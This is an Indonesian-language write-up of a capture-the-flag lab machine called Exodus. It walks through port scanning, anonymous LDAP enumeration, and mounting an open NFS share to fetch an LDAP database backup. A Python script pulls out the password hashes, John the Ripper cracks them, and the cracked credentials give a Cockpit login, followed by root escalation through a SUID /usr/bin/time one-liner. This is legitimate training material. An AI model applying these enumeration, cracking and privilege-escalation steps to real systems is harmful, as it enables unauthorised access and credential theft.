
|                   |                          |
| ----------------- | ------------------------ |
| **Target IP**     | 10.1.2.143               |
| **Difficulty**    | Moderate                 |
| **OS**            | Linux (Fedora 37 Server) |
| **Machine Maker** | modpr0be                 |

> _"To forget one's purpose is the commonest form of stupidity."_ — Friedrich Nietzsche

---

### Ringkasan Eksekutif

Mesin **Exodus** (10.1.2.143) berhasil dikuasai penuh (root) melalui rangkaian kesalahan konfigurasi yang saling terhubung, dimulai dari layanan yang mengizinkan akses tanpa autentikasi hingga berujung pada _privilege escalation_ melalui binary SUID yang salah konfigurasi.

**Alur singkat serangan:**

1. **LDAP (port 389)** mengizinkan _anonymous bind_, membocorkan struktur direktori dan 7 akun pengguna, termasuk 3 anggota grup `server_admins`.
2. **NFS share** (`/removeonly`) di-_export_ secara publik (`*`) tanpa pembatasan host, memungkinkan berkas backup mentah database LDAP (`db2bak.tar.bz2`) diunduh tanpa autentikasi.
3. Backup tersebut berisi seluruh **hash password pengguna** (`{SSHA512}` dan `{PBKDF2-SHA512}`), yang berhasil diekstraksi dan sebagian di-_crack_ secara offline menggunakan John the Ripper  menghasilkan 3 kredensial valid (`putra`, `elise`, `ashley`).
4. Kredensial `putra`/`elise` digunakan untuk login ke panel **Cockpit** (port 9090), memberikan akses _shell_ interaktif meski dalam mode terbatas (_limited access_, bukan sudoer).
5. Ditemukan binary **`/usr/bin/time`** dengan bit SUID aktif dan kepemilikan `root` konfigurasi tidak lazim yang tercatat di GTFOBins dimanfaatkan untuk eskalasi privilege menjadi root.

**Hasil akhir:** `user.txt` diperoleh melalui akun `putra`, dan `root.txt` diperoleh melalui eksploitasi SUID pada `/usr/bin/time`.
### 1. Reconnaissance

Pemindaian awal dilakukan menggunakan `rustscan` dikombinasikan dengan `nmap`:

```bash
rustscan -a 10.1.2.143 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil Port Scan:**

|Port|Protokol|Service|Keterangan|
|---|---|---|---|
|80|tcp|http|Apache httpd 2.4.56 (Fedora Linux)|
|111|tcp|rpcbind|RPC|
|389|tcp|ldap|Anonymous bind diizinkan|
|2049|tcp|nfs_acl|RPC #100227|
|9090|tcp|ssl/zeus-admin?|Sertifikat self-signed "exodus" (Cockpit)|
|10000|tcp|http|MiniServ 1.996 (Webmin httpd)|
|20048|tcp|mountd|RPC|

Dua temuan prioritas: **LDAP anonymous bind** dan **NFS** aktif.

---

### 2. Enumeration

#### 2.1 LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.1.2.143:389 -s base namingContexts
```

**Hasil:** `namingContexts: dc=offensivelab,dc=local`

```bash
ldapsearch -x -H ldap://10.1.2.143:389 -b "dc=offensivelab,dc=local" > ldap_dump.txt
```

**7 akun ditemukan:**

|Username|UID|Home Directory|Member of|
|---|---|---|---|
|demo_user|99998|/var/empty (shell: /bin/false)|-|
|budi|1000|/home/budi|**server_admins**|
|elise|1001|/home/elise|**server_admins**|
|joni|1002|/home/joni|-|
|putra|1003|/home/putra|**server_admins**|
|ashley|1004|/home/ashley|-|
|madison|1005|/home/madison|-|

OU `permissions` dan `services` dicek namun kosong. Grup `server_admins` (budi, elise, putra) jadi target prioritas.

#### 2.2 NFS Enumeration

```bash
showmount -e 10.1.2.143
# Export list for 10.1.2.143:
# /removeonly *
```

Share diekspos ke `*`, langsung di-mount:

```bash
mkdir nfs_mount
sudo mount -t nfs 10.1.2.143:/removeonly nfs_mount
```

**Isi share:**

```
-rw-r--r-- 1 root root 47992 Mar 23 2023 db2bak.tar.bz2
```

---

### 3. Credential Extraction

#### 3.1 Ekstraksi Arsip

```bash
tar -xjvf db2bak.tar.bz2 -C ../db2bak
```

Ternyata backup mentah **389 Directory Server**, berisi `id2entry.db` dengan seluruh entry LDAP termasuk atribut `userPassword` (tidak ter-expose lewat anonymous bind biasa).

#### 3.2 Identifikasi Format Hash

```bash
strings id2entry.db | grep -A 5 -B 5 "budi\|elise\|putra"
```

Dua format ditemukan: **`{SSHA512}`** (mayoritas user) dan **`{PBKDF2-SHA512}`** (khusus `joni`). Nilai `userPassword::` adalah base64-encoded dari string hash lengkap.

#### 3.3 Otomatisasi Ekstraksi & Decode

```python
import re
import base64

with open('id2entry.db', 'rb') as f:
    data = f.read().decode('latin-1', errors='ignore')

pattern = r'uid: (\w+).*?userPassword:: ([A-Za-z0-9+/=\s]+?)\n\S'
raw_entries = re.findall(pattern, data, re.DOTALL)

results = {}
for uid, b64blob in raw_entries:
    clean_b64 = re.sub(r'\s+', '', b64blob)
    padding_needed = (-len(clean_b64)) % 4
    if padding_needed:
        clean_b64 += '=' * padding_needed
    try:
        decoded = base64.b64decode(clean_b64).decode('latin-1', errors='ignore')
        results[uid] = decoded
    except Exception as e:
        print(f"[!] {uid}: gagal decode - {e}")

# 'budi' terlewat regex karena duplikat entry (history) di database
budi_b64 = "e1NTSEE1MTJ9b3RoT1pGREJjTG93QnE5QkFVNk43b1RKWDU3cHJSaUhXQUE2SzlQOTNYRVY3SHhrWDl6ZDlBV2RHR2E1aGlqdWRibkJzK0hVdFBWM29QWGNFQU42bDNyTk4zejhDU2VE"
results['budi'] = base64.b64decode(budi_b64).decode('latin-1', errors='ignore')

with open('hashes.txt', 'w') as f:
    for uid, hashval in results.items():
        f.write(f"{uid}:{hashval}\n")
```

#### 3.4 Password Cracking

```bash
john hashes.txt --wordlist=/home/greed/rockyou.txt
```

**Hasil:**

```
Loaded 5 password hashes with 5 different salts (SSHA512, LDAP [SHA512 256/256 AVX2 4x])
jellybean        (putra)
1qazxsw23edc     (elise)
mynameisashley   (ashley)
```

|User|Password|Grup|Status|
|---|---|---|---|
|putra|`jellybean`|server_admins|✅ Cracked|
|elise|`1qazxsw23edc`|server_admins|✅ Cracked|
|ashley|`mynameisashley`|-|✅ Cracked|
|budi|—|server_admins|❌ Belum berhasil|
|joni|— (PBKDF2-SHA512)|-|❌ Belum dicoba|

---

### 4. Initial Access

Kredensial `putra`/`elise` gagal di Webmin (10000), namun berhasil login ke **Cockpit** (port 9090, CN sertifikat: `exodus`).

- Dashboard `putra@exodus`, Fedora Linux 37 Server, status **"Limited access"**.
- Via menu **Terminal**, diperoleh shell interaktif sebagai `elise`:

```
whoami → elise
id → uid=1001(elise) gid=1001(elise) groups=1001(elise) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Login ulang sebagai `putra` via Terminal Cockpit memberi akses flag:

```
user.txt: 595a5d41********************
```

---

### 5. Privilege Escalation

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Temuan tidak lazim:**

```
-rwsr-xr-x. 1 root root 29K Jul 23 2022 /usr/bin/time
```

Binary `/usr/bin/time` memiliki SUID bit aktif milik `root` bukan konfigurasi default, dan tercatat di **GTFOBins** sebagai vektor privilege escalation.

```bash
/usr/bin/time -f "" /bin/sh -p
dan ambil flagnya
root.txt: fcfc8a94b0**************
```

---